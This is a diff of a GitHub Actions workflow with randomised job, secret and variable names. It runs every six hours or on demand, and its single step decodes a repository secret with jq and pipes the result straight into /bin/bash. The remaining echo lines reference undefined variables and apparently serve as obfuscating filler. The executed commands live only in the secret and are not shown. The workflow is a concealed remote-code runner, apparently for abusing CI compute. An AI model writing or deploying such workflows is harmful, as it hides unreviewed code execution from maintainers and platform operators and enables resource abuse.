@@ -1,33 +1,29 @@
 name: luzhanyuan7631
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '51 5/6 * * *'
-jobs:  # 30105
+    - cron: '38 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: luzhanyuan7631
         env:
-          waj83548: ${{ secrets.waj83548 }}
+          n70873: ${{ secrets.n70873 }}
         run: |
-          echo $waj83548 | jq -r .o8 | /bin/bash
-          echo $qzci8 | jq -r .pyyxn237 | /bin/bash
-          echo $zbog267 | jq -r .gfhj1 | /bin/bash
-          echo $je3 | jq -r .jomr046 | /bin/bash
-          echo $nqfnb906 | jq -r .mqo191 | /bin/bash
-          echo $rntiz223 | jq -r .ib7951 | /bin/bash
-          echo $rgq8488 | jq -r .i3 | /bin/bash
-          echo $txdf9 | jq -r .gv3 | /bin/bash
-          echo $qmtbx68210 | jq -r .dbm85255 | /bin/bash
-          echo $zeiu76442 | jq -r .cvekc05 | /bin/bash
-          echo $cb56 | jq -r .l5031 | /bin/bash
-          echo $avvc34345 | jq -r .qdp5553 | /bin/bash
-          echo $q279 | jq -r .sgu545 | /bin/bash
-          echo $enzlf47269 | jq -r .kaum3498 | /bin/bash
-          echo $y0 | jq -r .nr2 | /bin/bash
-          echo $ykolc586 | jq -r .cxx9315 | /bin/bash
-          echo $cqzhp58637 | jq -r .yd0010 | /bin/bash
-          echo $qfpz4294 | jq -r .tcl224 | /bin/bash
+          echo $n70873 | jq -r .pmxst6815 | /bin/bash
+          echo $j3726 | jq -r .zqn0339 | /bin/bash
+          echo $lerxr7986 | jq -r .ks40 | /bin/bash
+          echo $nwmvl59600 | jq -r .mat07 | /bin/bash
+          echo $zuv4431 | jq -r .t96 | /bin/bash
+          echo $sswsa755 | jq -r .b69 | /bin/bash
+          echo $jrb600 | jq -r .arryo6 | /bin/bash
+          echo $yflxr33 | jq -r .j01 | /bin/bash
+          echo $i991 | jq -r .s0 | /bin/bash
+          echo $sbwqo03 | jq -r .oti3 | /bin/bash
+          echo $lxcs1 | jq -r .s091 | /bin/bash
+          echo $emq607 | jq -r .yimfo80805 | /bin/bash
+          echo $jqkm46 | jq -r .vkaf069 | /bin/bash
 
